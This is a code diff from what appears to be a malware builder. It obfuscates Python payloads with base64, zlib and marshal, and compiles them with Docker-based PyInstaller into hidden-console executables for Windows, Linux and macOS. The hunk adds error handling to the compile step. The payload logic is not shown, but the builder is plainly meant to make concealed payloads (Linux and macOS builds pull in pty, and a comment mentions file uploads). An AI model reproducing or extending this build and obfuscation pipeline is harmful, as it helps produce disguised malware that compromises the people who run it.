@@ -232,43 +232,50 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         if not os.path.isdir("payloads"):
             os.makedirs("payloads")
 
-        if os_name == "Windows":
-            result = subprocess.run(
-                f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=icon.ico --hidden-import=pypiwin32 --hidden-import=audioop-lts --hidden-import=pycryptodome --hidden-import=audioop-lts --hide-console hide-early {payload_file_name}.py"',
-                shell=True,
-                capture_output=True,
-            )
-            print(
-                result.stdout.decode(), result.stderr.decode()
-            )  # Print output for debugging
-            shutil.copy(
-                f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe"
-            )
+        try:
+            if os_name == "Windows":
+                result = subprocess.run(
+                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=icon.ico --hidden-import=pypiwin32 --hidden-import=audioop-lts --hidden-import=pycryptodome --hidden-import=audioop-lts --hide-console hide-early {payload_file_name}.py"',
+                    shell=True,
+                    capture_output=True,
+                )
+                print(
+                    result.stdout.decode(), result.stderr.decode()
+                )  # Print output for debugging
+                shutil.copy(
+                    f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe"
+                )
 
-        elif os_name == "Linux":
-            result = subprocess.run(
-                f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=icon.ico --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
-                shell=True,
-                capture_output=True,
-            )
-            print(
-                result.stdout.decode(), result.stderr.decode()
-            )  # Print output for debugging
-            shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
+            elif os_name == "Linux":
+                result = subprocess.run(
+                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=icon.ico --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
+                    shell=True,
+                    capture_output=True,
+                )
+                print(
+                    result.stdout.decode(), result.stderr.decode()
+                )  # Print output for debugging
+                shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
-        elif os_name == "OSX":
-            result = subprocess.run(
-                f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --icon=icon.ico --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
-                shell=True,
-                capture_output=True,
-            )
-            print(
-                result.stdout.decode(), result.stderr.decode()
-            )  # Print output for debugging
-            shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
+            elif os_name == "OSX":
+                result = subprocess.run(
+                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-osx:latest "pyinstaller -F --onefile --windowed --icon=icon.ico --hidden-import=pty --hide-console hide-early {payload_file_name}.py"',
+                    shell=True,
+                    capture_output=True,
+                )
+                print(
+                    result.stdout.decode(), result.stderr.decode()
+                )  # Print output for debugging
+                shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
-        os.remove(f"{payload_file_name}.py")
-        os.remove(f"{payload_file_name}.spec")
+            os.remove(f"{payload_file_name}.py")
+            os.remove(f"{payload_file_name}.spec")
+        
+        except Exception as e:
+            print(e)
+            os.remove(f"{payload_file_name}.py")
+            os.remove(f"{payload_file_name}.spec")
+
 
     # File uploads is working again full
 
